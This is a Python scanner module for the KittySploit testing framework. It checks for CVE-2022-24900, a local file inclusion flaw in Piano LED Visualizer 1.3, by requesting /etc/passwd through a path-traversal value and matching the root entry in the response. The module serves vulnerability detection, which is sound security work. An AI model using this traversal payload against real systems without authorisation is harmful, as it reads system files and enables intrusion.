#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Piano LED Visualizer 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Piano LED Visualizer 1.3 - Local File Inclusion Detection',
        'description': 'Piano LED Visualizer 1.3 and prior are vulnerable to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'lfi', 'piano', 'iot', 'oss', 'piano_led_visualizer_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/onlaj/Piano-LED-Visualizer/issues/350',
            'https://vuldb.com/?id.198714',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-24900',
            'https://github.com/onlaj/Piano-LED-Visualizer/commit/3f10602323cd8184e1c69a76b815655597bf0ee5',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-24900',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/change_setting?second_value=no_reload&disable_sequence=true&value=../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Piano LED Visualizer 1.3 - Local File Inclusion detected",
                path='/api/change_setting?second_value=no_reload&disable_sequence=true&value=../../../../../../../etc/passwd',
            )
            return True
        return False

